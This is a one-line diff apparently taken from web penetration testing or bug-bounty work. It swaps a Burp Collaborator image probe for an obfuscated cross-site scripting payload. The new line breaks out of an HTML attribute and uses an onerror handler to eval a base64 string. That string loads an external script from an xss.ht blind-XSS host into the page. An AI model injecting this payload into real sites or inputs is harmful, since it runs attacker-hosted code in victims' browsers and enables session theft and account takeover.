@@ -1,1 +1,1 @@
-<img src="http://txugbmudx0py94lgsyhtzvagi7oxcm.burpcollaborator.net"></img>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbW9oYW4ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
